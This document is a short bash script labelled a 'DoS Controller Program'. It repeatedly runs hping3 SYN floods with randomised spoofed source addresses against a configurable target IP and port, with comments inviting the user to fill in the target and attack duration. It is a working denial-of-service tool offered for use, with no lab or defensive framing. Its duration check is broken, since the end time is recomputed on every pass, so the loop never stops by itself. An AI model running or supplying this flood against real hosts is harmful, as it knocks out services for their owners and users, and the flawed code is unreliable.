#!/bin/bash

# DoS Controller Program

target_ip="192.168.1.100"  # Replace with the target IP address
target_port=80  # Replace with the target port
duration=300  # Replace with the desired duration of the DoS attack in seconds

while true; do
    # Launch DoS attack on the target IP and port
    hping3 -c 10000 -d 120 -S -w 64 --flood --rand-source $target_ip -p $target_port
    
    # Sleep for a random interval before launching the next attack
    sleep $((RANDOM % 5))
    
    # Check if the attack duration has exceeded the desired duration
    current_time=$(date +%s)
    end_time=$((current_time + duration))
    if [[ $current_time -ge $end_time ]]; then
        break
    fi
done

echo "DoS attack completed."
